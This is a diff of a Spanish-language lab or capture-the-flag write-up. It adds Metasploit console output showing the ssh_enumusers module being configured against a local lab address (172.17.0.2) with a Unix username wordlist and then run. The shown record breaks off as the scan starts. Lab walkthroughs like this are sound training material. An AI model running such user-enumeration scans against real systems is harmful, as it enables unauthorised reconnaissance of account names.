@@ -35,9 +35,38 @@ Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
 con esto, busqué la versión de ssh y nos aparece una vulnerabilidad para enumerar ususarios, la uso con metasploit y encuentro esto
 
 ```bash 
+❯ msfconsole
+Metasploit tip: To save all commands executed since start up to a file, use the 
+makerc command
+                                                  
 
-# Antes entramos a metasploit poniendo msfocnsole en la temrinal
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+       .dOOo   .OOOOocccxOOOO.   xOOd.
+         ,kOl  .OOOOOOOOOOOOO. .dOk,
+           :kk;.OOOOOOOOOOOOO.cOk:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
 
+       =[ metasploit v6.3.44-dev                          ]
++ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]
++ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
 
 [msf](Jobs:0 Agents:0) >> search openssh
 
@@ -63,9 +92,10 @@ Module options (auxiliary/scanner/ssh/ssh_enumusers):
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    CHECK_FALSE   true             no        Check for false positives (random username)
-   DB_ALL_USERS  false             no        Add all users in the current database to the list
+   DB_ALL_USERS  false            no        Add all users in the current database to the list
    Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS        172.17.0.2       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-meta
+                                            sploit.html
    RPORT         22               yes       The target port
    THREADS       1                yes       The number of concurrent threads (max one per host)
    THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack only)
@@ -83,8 +113,11 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_enumusers) >> set rhosts 172.17.0.2
+rhosts => 172.17.0.2
 [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_enumusers) >> set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
 USER_FILE => /usr/share/wordlists/metasploit/unix_users.txt
+
 [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_enumusers) >> run
 
 [*] 172.17.0.2:22 - SSH - Using malformed packet technique
